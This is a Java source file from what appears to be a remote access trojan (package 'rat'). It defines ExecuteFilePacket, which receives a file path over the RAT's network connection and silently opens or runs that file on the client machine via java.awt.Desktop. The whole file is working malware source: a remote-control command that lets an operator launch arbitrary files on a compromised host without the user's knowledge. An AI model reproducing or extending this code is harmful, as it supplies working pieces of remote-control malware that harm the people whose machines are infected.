package de.sogomn.rat.packet;

import java.awt.Desktop;
import java.awt.Desktop.Action;
import java.io.File;
import java.io.IOException;

import de.sogomn.rat.ActiveClient;

public final class ExecuteFilePacket implements IPacket {
	
	private String path;
	
	public ExecuteFilePacket(final String path) {
		this.path = path;
	}
	
	public ExecuteFilePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(path);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		path = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final File file = new File(path);
		
		if (Desktop.isDesktopSupported() && file.exists()) {
			final Desktop desktop = Desktop.getDesktop();
			
			if (desktop.isSupported(Action.OPEN)) {
				try {
					desktop.open(file);
				} catch (final IOException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

}
